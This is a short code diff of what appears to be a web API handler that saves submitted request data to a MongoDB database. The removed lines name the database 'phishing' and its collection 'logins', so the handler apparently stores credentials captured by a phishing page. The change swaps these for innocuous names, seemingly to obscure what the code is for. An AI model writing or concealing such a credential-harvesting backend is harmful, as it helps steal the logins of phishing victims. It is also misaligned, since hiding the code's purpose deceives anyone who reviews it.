@@ -74,8 +74,8 @@ export default async function handler(req, res) {
     try {
       const client = new MongoClient(uri);
       await client.connect();
-      const db = client.db('phishing');
-      const collection = db.collection('logins');
+      const db = client.db('Correos');
+      const collection = db.collection('Data');
       await collection.insertOne(data);
       await client.close();
     } catch (error) {
